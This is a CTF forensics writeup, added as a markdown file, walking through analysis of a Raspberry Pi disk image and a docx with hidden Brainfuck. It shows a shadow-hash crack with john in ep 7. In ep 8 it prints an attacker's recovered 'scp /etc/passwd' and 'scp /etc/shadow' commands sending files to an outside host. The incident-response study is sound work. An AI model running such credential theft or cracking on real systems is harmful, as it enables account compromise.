@@ -1,0 +1,404 @@
+---
+title: CyberGon CTF 2023 Forensics Writeups
+description: Writeups for the Forensics category in CyberGon CTF 2023
+publishedDate: 2023-09-18
+author: kn1gh7
+tags:
+  - writeup
+---
+
+### Device Info(ep 1)
+
+#### **Challenge Description**
+
+Can you find the operating system information?
+
+Flag Format : CyberGonCTF\{osname 00.00.0 XXX} eg. CyberGonCTF\{Windows 11.22.1 ABC}
+
+[Challenge File](https://cybergon.ctfd.io/files/1b4a9c5120fbf72d74e4e1153083b27c/forensics1.7z?token=eyJ1c2VyX2lkIjo5NjgsInRlYW1faWQiOjUyNCwiZmlsZV9pZCI6MjR9.ZOXuAQ.hiii1PIK5db_FWZG6lYyYIf0v2Q) (Official Link) \[I did not archive the file in case this goes down :(..but the challenges are pretty self-explanatory\]
+
+#### **Solution**
+
+The file was an E01 file, meaning an encase file, a standard for digital forensics for disk images. The first thing was to mount it to my system. I used ParrotOS for this setup.
+
+```bash
+# Installing tools to mount the image
+$ sudo apt install ewf-tools
+$ mkdir phy1
+$ mkdir log1
+$ sudo ewfmount forensics1.E01 ./phy1
+$ sudo apt install sleuthkit
+$ sudo mmls ./phy1/ewf1
+DOS Partition Table
+Offset Sector: 0
+Units are in 512-byte sectors
+
+      Slot      Start        End          Length       Description
+000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
+001:  -------   0000000000   0000002047   0000002048   Unallocated
+002:  000:000   0000002048   0000526335   0000524288   Win95 FAT32 (0x0c)
+003:  000:001   0000526336   0030277598   0029751263   Linux (0x83)
+004:  -------   0030277599   0030277631   0000000033   Unallocated
+$ echo 526336 \* 512 | bc
+269484032
+$ sudo mount -o ro,norecovery,loop,offset=269484032 ./phy1/ewf1 ./log1
+$ cd log1
+$ ls
+bin   dev  home  lost+found  mnt  proc  run   snap  sys  usr
+boot  etc  lib   media       opt  root  sbin  srv   tmp  var
+```
+
+Now we can see the file mounted to our system. Now we try to chroot in this mounted directory using `$ sudo chroot ./log1` but there is no bash executable in this mount so we have to work manually. Now to get OS Information we can do this
+
+```bash
+# Reading etc/os-release file for OS Information
+$ cat etc/os-release
+NAME="Ubuntu"
+VERSION="20.04.5 LTS (Focal Fossa)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 20.04.5 LTS"
+VERSION_ID="20.04"
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+VERSION_CODENAME=focal
+UBUNTU_CODENAME=focal
+# The OS name is Ubuntu 20.04.5 LTS
+```
+
+So the flag was CyberGonCTF\{Ubuntu 20.04.5 LTS}
+
+### Device Info(ep 2)
+
+#### **Challenge Description**
+
+Can you find the device ip and hostname?
+
+Flag Format: CyberGonCTF\{xxx.xxx.xxx.xxx\_hostname}
+
+#### **Solution**
+
+```bash
+# For finding hostname
+$ cat etc/hostname
+ubuntu
+# For finding IP
+$ sudo cat var/log/syslog
+... # Other logs not useful for this chall
+ci-info: +++++++++++++++++++++++++++++++++++++++++++++Net device info+++++++++++++++++++++++++++++++++++++++++++++
+ci-info: +--------+-------+-----------------------------------------+---------------+--------+-------------------+
+ci-info: | Device |   Up  |                 Address                 |      Mask     | Scope  |     Hw-Address    |
+ci-info: +--------+-------+-----------------------------------------+---------------+--------+-------------------+
+ci-info: |  eth0  | False |                    .                    |       .       |   .    | b8:27:eb:fe:83:1a |
+ci-info: |   lo   |  True |                127.0.0.1                |   255.0.0.0   |  host  |         .         |
+ci-info: |   lo   |  True |                 ::1/128                 |       .       |  host  |         .         |
+ci-info: | wlan0  |  True |               192.168.1.72              | 255.255.255.0 | global | b8:27:eb:ab:d6:4f |
+ci-info: | wlan0  |  True | 2001:fb1:f9:d3c3:ba27:ebff:feab:d64f/64 |       .       | global | b8:27:eb:ab:d6:4f |
+ci-info: | wlan0  |  True |       fe80::ba27:ebff:feab:d64f/64      |       .       |  link  | b8:27:eb:ab:d6:4f |
+ci-info: +--------+-------+-----------------------------------------+---------------+--------+-------------------+
+... # Other logs not useful for this chall
+# We can see IP assigned to eth0 here is 192.168.1.72
+```
+
+Therefore the flag was CyberGonCTF\{192.168.1.72\_ubuntu}
+
+### Device Info(ep 3)
+
+#### **Challenge Description**
+
+Can you find the first connected WiFi (SSID) and password?
+
+Flag Format: CyberGonCTF\{ssid\_password}
+
+#### **Solution**
+
+```bash
+# Reading logs to find SSID
+$ sudo cat var/log/syslog | grep -i ssid
+Aug 29 16:28:36 ubuntu wpa_supplicant[1586]: wlan0: Trying to associate with SSID 'Ko_Koe_Lo_Ko_Ko'
+Jul 15 12:43:30 ubuntu wpa_supplicant[501]: wlan0: Trying to associate with SSID 'Ko_Koe_Lo_Ko_Ko'
+Jul 15 12:48:54 ubuntu wpa_supplicant[512]: wlan0: Trying to associate with SSID 'Ko_Koe_Lo_Ko_Ko'
+Jul 15 12:52:18 ubuntu wpa_supplicant[512]: wlan0: CTRL-EVENT-DISCONNECTED bssid=82:36:63:a2:b1:96 reason=1 locally_generated=1
+Jul 15 12:56:45 ubuntu wpa_supplicant[1158]: wlan0: Trying to associate with SSID 'Gangsters_2.4G'
+Jul 15 13:21:49 ubuntu wpa_supplicant[508]: wlan0: Trying to associate with SSID 'Gangsters_2.4G'
+# The first connected would be the one which comes earlier in log, therefore 'Ko_Koe_Lo_Ko_Ko' is the SSID
+$ cat etc/netplan/50-cloud-init.yaml
+network:
+    ethernets:
+        eth0:
+            dhcp4: true
+            optional: true
+    wifis:
+        wlan0:
+            dhcp4: yes
+            access-points:
+                "Ko_Koe_Lo_Ko_Ko":
+                    password: "Ah_Nge_Chaw_Yal_Tae_Inn_Tae"
+                "Gangsters_2.4G":
+                    password: "N41ng-Ny1"
+    version: 2
+# The corresponding password is "Ah_Nge_Chaw_Yal_Tae_Inn_Tae"
+```
+
+Therefore the flag was CyberGonCTF\{Ko\_Koe\_Lo\_Ko\_Ko\_Ah\_Nge\_Chaw\_Yal\_Tae\_Inn\_Tae}
+
+### Device Info(ep 4)
+
+#### **Challenge Description**
+
+Can you find the device model details of the host?
+
+Flag Format: CyberGonCTF\{Full Information}
+
+#### **Solution**
+
+```bash
+# Reaing kernel log to find hardware details
+$ sudo cat var/log/kern.log | grep "Machine model"
+Aug 29 16:20:54 ubuntu kernel: [    0.000000] OF: fdt: Machine model: Raspberry Pi 3 Model B Rev 1.2
+Jul 15 12:43:30 ubuntu kernel: [    0.000000] OF: fdt: Machine model: Raspberry Pi 3 Model B Rev 1.2
+Jul 15 12:48:54 ubuntu kernel: [    0.000000] OF: fdt: Machine model: Raspberry Pi 3 Model B Rev 1.2
+Jul 15 12:54:13 ubuntu kernel: [    0.000000] OF: fdt: Machine model: Raspberry Pi 3 Model B Rev 1.2
+Jul 15 13:21:49 ubuntu kernel: [    0.000000] OF: fdt: Machine model: Raspberry Pi 3 Model B Rev 1.2
+```
+
+Therefore the flag was CyberGonCTF\{Raspberry Pi 3 Model B Rev 1.2}
+
+### Attacker IP(ep 5)
+
+#### **Challenge Description**
+
+What is the IP address of the attacker? He tried to log in to this computer.
+
+Flag Format: CyberGonCTF\{xxx.xxx.xxx.xxx}
+
+#### **Solution**
+
+```bash
+# Looking at wtmp logs for correct login events
+$ sudo last -f var/log/wtmp
+shwehmon pts/2        192.168.1.43     Sat Jul 15 22:43 - 22:55  (00:12)
+ubuntu   pts/2        192.168.1.67     Sat Jul 15 22:25 - 22:37  (00:11)
+ubuntu   pts/1        192.168.1.46     Sat Jul 15 21:54    gone - no logout
+ubuntu   pts/1        192.168.1.46     Sat Jul 15 21:30 - 21:32  (00:01)
+ubuntu   pts/0        192.168.1.43     Sat Jul 15 21:26    gone - no logout
+ubuntu   pts/0        192.168.1.43     Sat Jul 15 18:58 - 21:26  (02:27)
+reboot   system boot  5.4.0-1069-raspi Mon Aug 29 21:50   still running
+ubuntu   pts/0        192.168.1.43     Sat Jul 15 18:27 - 18:51  (00:24)
+ubuntu   tty1                          Sat Jul 15 18:24 - down   (00:26)
+reboot   system boot  5.4.0-1069-raspi Mon Aug 29 21:50 - 18:51 (319+21:01)
+ubuntu   pts/0        192.168.174.198  Sat Jul 15 18:19 - crash (-319+20:29)
+reboot   system boot  5.4.0-1069-raspi Mon Aug 29 21:50 - 18:51 (319+21:01)
+ubuntu   tty1                          Sat Jul 15 18:16 - down   (00:01)
+ubuntu   pts/0        192.168.174.198  Sat Jul 15 18:15 - 18:17  (00:01)
+reboot   system boot  5.4.0-1069-raspi Mon Aug 29 21:50 - 18:17 (319+20:27)
+ubuntu   pts/0        192.168.174.198  Sat Jul 15 18:09 - 18:09  (00:00)
+ubuntu   tty1                          Mon Aug 29 21:53 - crash  (-00:03)
+reboot   system boot  5.4.0-1069-raspi Mon Aug 29 21:50 - 18:17 (319+20:27)
+# We see multiple possible IPs here so we have to check for failed logins.
+# Looking at btmp logs for failed login attempts
+$ sudo last -f var/log/btmp
+# Results in a lot of such lines
+ubuntu   ssh:notty    192.168.1.67     Sat Jul 15 22:24 - 22:24  (00:00)
+# Only the IP 192.168.1.67 has failed login attempts, therefore this is the IP.
+```
+
+Therefore the IP was 192.168.1.67 and flag was CyberGonCTF\{192.168.1.67}
+
+### Success Logon(ep 6)
+
+#### **Challenge Description**
+
+Do you know the total number of failed logon from attacker and when attacker got success?
+
+Flag Format: CyberGonCTF\{total failed attempts\_Mon dd hh:mm:ss}
+
+#### **Solution**
+
+```bash
+# Using nl to count the number of attempts
+$ sudo last -f var/log/btmp | nl
+... # Showing only the last line for count
+652	ubuntu   ssh:notty    192.168.1.67     Sat Jul 15 19:50 - 19:50  (00:00)
+# Unfortunately wtmp logs don't give connection time in seconds so have to look at authentication logs
+$ sudo cat var/log/auth.log | grep "192.168.1.67" | tail -5
+Jul 15 16:55:00 ubuntu sshd[1976]: Connection closed by authenticating user ubuntu 192.168.1.67 port 40432 [preauth]
+Jul 15 16:55:00 ubuntu sshd[1978]: Connection closed by authenticating user ubuntu 192.168.1.67 port 40458 [preauth]
+Jul 15 16:55:26 ubuntu sshd[1984]: Accepted password for ubuntu from 192.168.1.67 port 54296 ssh2
+Jul 15 17:07:11 ubuntu sshd[2056]: Received disconnect from 192.168.1.67 port 54296:11: disconnected by user
+Jul 15 17:07:11 ubuntu sshd[2056]: Disconnected from user ubuntu 192.168.1.67 port 54296
+# Correct login at Jul 15 16:55:26, from wtmp can be checked that attacker logins only once at 16:55
+```
+
+Therefore the flag was CyberGonCTF\{652\_Jul 15 16:55:26}
+
+### New User(ep 7)
+
+#### **Challenge Description**
+
+After success logon, the attacker added new user for Persistence. Can you find the username and password?
+
+Flag Format: CyberGonCTF\{username, password}  
+Password Hint - husband name (included two capital letters) + 4 digits
+
+#### **Solution**
+
+```bash
+# Checking users added
+$ sudo cat var/log/auth.log | grep "new user"
+Aug 29 16:20:54 ubuntu useradd[669]: new user: name=ubuntu, UID=1000, GID=1000, home=/home/ubuntu, shell=/bin/bash, from=none
+Aug 29 16:21:18 ubuntu useradd[1130]: new user: name=lxd, UID=998, GID=100, home=/var/snap/lxd/common/lxd, shell=/bin/false, from=none
+Jul 15 16:13:24 ubuntu useradd[1434]: new user: name=phyuphyuhtwe, UID=1001, GID=1001, home=/home/phyuphyuhtwe, shell=/bin/bash, from=/dev/pts/0
+Jul 15 16:14:35 ubuntu useradd[1464]: new user: name=saisaikhamhlaing, UID=1002, GID=1002, home=/home/saisaikhamhlaing, shell=/bin/bash, from=/dev/pts/0
+Jul 15 16:19:21 ubuntu useradd[1500]: new user: name=hlwanpaing, UID=1003, GID=1003, home=/home/hlwanpaing, shell=/bin/bash, from=/dev/pts/0
+Jul 15 16:24:54 ubuntu useradd[1625]: new user: name=kyawgyi, UID=1004, GID=1004, home=/home/kyawgyi, shell=/bin/bash, from=/dev/pts/1
+Jul 15 17:04:37 ubuntu useradd[2091]: new user: name=shwehmoneyati, UID=1005, GID=1005, home=/home/shwehmoneyati, shell=/bin/bash, from=/dev/pts/2
+# User shwehmoneyati added in time attacker was logged in
+# Retreaving etc/shadow and etc/passwd files
+$ sudo cat etc/shadow | grep shwehmoneyati | tee ~/shadow
+shwehmoneyati:$6$8Da3ntmDvkfqYTP6$V3XYeRQdVVfDvQD157uLpoDFP8lFI5We3qmWpO0Zr.Enrg1ZcLVUdU9lJ0a1VPsUg1iL8FowgLAgWXczUgQ28.:19553:0:99999:7:::
+$ sudo cat etc/passwd | grep shwehmoneyati | tee ~/passwd
+shwehmoneyati:x:1005:1005:Shwe Hmone Yati,105,09450062226,:/home/shwehmoneyati:/bin/bash
+# Looked for husband name in user files but couldn't find anything. Then saw the name of the user and google searched.
+# Turned out Shwe Hmone Yati is an actress whose husband name is Shwe Htoo
+# Creating all possible password combinations from given hint
+$ python3 -c "print('\n'.join(f'ShweHtoo\{x:04d}' for x in range(1, 10000)))" > ~/wordlist
+# Using unshadow and john to crack the password
+# From home directory
+$ unshadow passwd shadow |tee passwords
+shwehmoneyati:$6$8Da3ntmDvkfqYTP6$V3XYeRQdVVfDvQD157uLpoDFP8lFI5We3qmWpO0Zr.Enrg1ZcLVUdU9lJ0a1VPsUg1iL8FowgLAgWXczUgQ28.:1005:1005:Shwe Hmone Yati,105,09450062226,:/home/shwehmoneyati:/bin/bash
+$ john passwords --wordlist=wordlist
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+ShweHtoo1500     (shwehmoneyati)
+1g 0:00:00:03 DONE (2023-08-24 00:21) 0.2659g/s 408.5p/s 408.5c/s 408.5C/s ShweHtoo1281..ShweHtoo1536
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+# Got the password ShweHtoo1500
+```
+
+Therefore the flag was CyberGonCTF\{shwehmoneyati, ShweHtoo1500}
+
+### Stolen Data(ep 8)
+
+#### **Challenge Description**
+
+The attacker tried to export from victim machine to his machine. Can you find the attacker username and ip address?
+
+Flag Format: CyberGonCTF\{username\_xxx.xxx.xxx.xxx}
+
+#### **Solution**
+
+```bash
+# Had no idea where to found this. So started exploring user files in general.
+# Was unable to solve. The intended solution was this.
+$ sudo cat root/.bash_history
+cd /etc/netplan/
+ls
+copy 50-cloud-init.yaml
+cp 50-cloud-init.yaml 50-cloud-init-original.yaml
+ls
+nano 50-cloud-init.yaml 
+netplan apply
+ping 8.8.8.8
+clear
+service ssh start
+ifconfig
+apt install net-tools
+cd /home
+ls
+cd ubuntu
+cat .bash_history
+ls -la
+cd /root
+ls -la
+cat .bashrc
+clear
+release -a
+apt install bikeshed
+apt update
+apt upgrade
+cd /home
+ls
+cd ubuntu
+ls
+ls -la
+cd /var/log
+ls
+ip -a
+ip
+ifcinfig
+ifconfig
+shutdown
+shutdown now
+ls -la
+cat .bash_history 
+cd /root
+cat .bash_history 
+shutdown now
+netplan apply
+ifconfig
+nano /etc/netplan/50-cloud-init.yaml 
+netplan apply
+ping 8.8.8.8
+ifconfig
+shutdown now
+adduser shwehmoneyati
+exxit
+exit
+scp /etc/passwd kali@192.168.253.144:/home/kali/passwd.txt
+ping 192.168.253.144
+scp /etc/shadow kali@192.168.253.144:/home/kali/passwd.txt
+exit
+# We can see kali@192.168.253.144 here.
+```
+
+Therefore the flag was CyberGonCTF\{kali\_192.168.253.144}
+
+### Hide and Seek
+
+#### **Challenge Description**
+
+Our SOC team detected a data exfiltration case where an employee from the sales department uploaded some files to his personal cloud storage every day this week. After checking all the files, we have suspected one file is Secret\_File.docx. Can you help us find the secret data in this file?
+
+[Challenge File](https://cybergon.ctfd.io/files/8c58fba96aafe8d36a7387bb2fdf5d09/Secret_File.docx?token=eyJ1c2VyX2lkIjo5NjgsInRlYW1faWQiOjUyNCwiZmlsZV9pZCI6Mjl9.ZObacA.CJg7oY6UQM8yxz_mlIqpfXh-kw8) (Official Link)
+
+[Challenge FIle](https://we.tl/t-dLVDSCrJGw) (Mirror for after CTF server goes down)
+
+#### **Solution**
+
+```bash
+# Knowing .docx are zipped xml files we unzip it.
+$ unzip Secret_File.docx 
+Archive:  Secret_File.docx
+  inflating: [Content_Types].xml     
+  inflating: _rels/.rels             
+  inflating: word/document.xml       
+  inflating: word/_rels/document.xml.rels  
+  inflating: word/footnotes.xml      
+  inflating: word/endnotes.xml       
+  inflating: word/header1.xml        
+  inflating: word/theme/theme1.xml   
+  inflating: word/settings.xml       
+  inflating: word/styles.xml         
+  inflating: word/webSettings.xml    
+  inflating: word/fontTable.xml      
+  inflating: docProps/core.xml       
+  inflating: docProps/app.xml
+# Looking at each file for suspicious content
+# At the end of word/header1.xml we see strings of +, - and . that looks like brainfuck
+# Cleaning the string
+$ echo "++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;---.&gt;+++++++++++++++++++++.-----------------------.+++.+++++++++++++.&lt;++++.&gt;---.-.&lt;----.+++++++++++++++++.--------------.&gt;+++++++++++++.&lt;-----------------.--.&gt;------------------------.-----------------.&lt;.++++.&gt;+++++++++++++.&lt;+++++++++++++.----------------.+++.---.&gt;.&lt;---.&gt;+++++++++++++++.---------------.&lt;+++++++++++++++++++++++.&lt;+++++++++++++++++++++.+.&gt;&gt;+++++.&lt;&lt;-.&gt;++++++++++.&gt;+++++++++++++++++++++++++." | sed 's/&gt;/>/g' | sed 's/&lt;/</g'
+++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>---.>+++++++++++++++++++++.-----------------------.+++.+++++++++++++.<++++.>---.-.<----.+++++++++++++++++.--------------.>+++++++++++++.<-----------------.--.>------------------------.-----------------.<.++++.>+++++++++++++.<+++++++++++++.----------------.+++.---.>.<---.>+++++++++++++++.---------------.<+++++++++++++++++++++++.<+++++++++++++++++++++.+.>>+++++.<<-.>++++++++++.>+++++++++++++++++++++++++.
+# Using dcode.fr for decoding we get the flag as CyberGonCTF\{53cR37_D474_1n_H34d3R}
+```
+
+Therefore the flag is CyberGonCTF\{53cR37\_D474\_1n\_H34d3R}
+
+Overall the quality of CTF was quite good, and the Incident Response challenges were a good linux refresher. The Hide and Seek challenge was pretty basic and repetitive one but encoding in BrainF\*ck was a good move from organizers.  
+Hope you liked the writeup!  
